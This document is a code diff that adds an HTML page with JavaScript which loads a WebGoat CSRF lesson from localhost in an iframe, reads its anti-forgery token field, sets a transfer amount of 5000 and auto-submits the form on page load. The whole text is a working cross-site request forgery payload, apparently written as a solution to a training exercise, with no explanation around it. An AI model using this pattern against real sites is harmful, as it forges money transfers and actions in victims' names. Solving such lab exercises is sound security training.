@@ -1,0 +1,13 @@
+<script type="text/javascript">function clickConfirm(){
+  var myframe = document.getElementById("myframe");
+  console.log("hello ",myframe);
+  var token = myframe.contentWindow.document.getElementsByName("token")[0];
+  console.log(token);
+  var confirm = myframe.contentWindow.document.getElementsByName("transfer")[0];
+  confirm.value = 5000;
+  var submit = myframe.contentWindow.document.querySelectorAll('input[type=submit]')[0];
+  console.log("submit button ",submit);
+  submit.click()
+  }
+</script>
+<iframe id="myframe" src="http://localhost:8090/WebGoat/attack?Screen=605842438&menu=900&transfer=main" onload="clickConfirm()"></iframe>
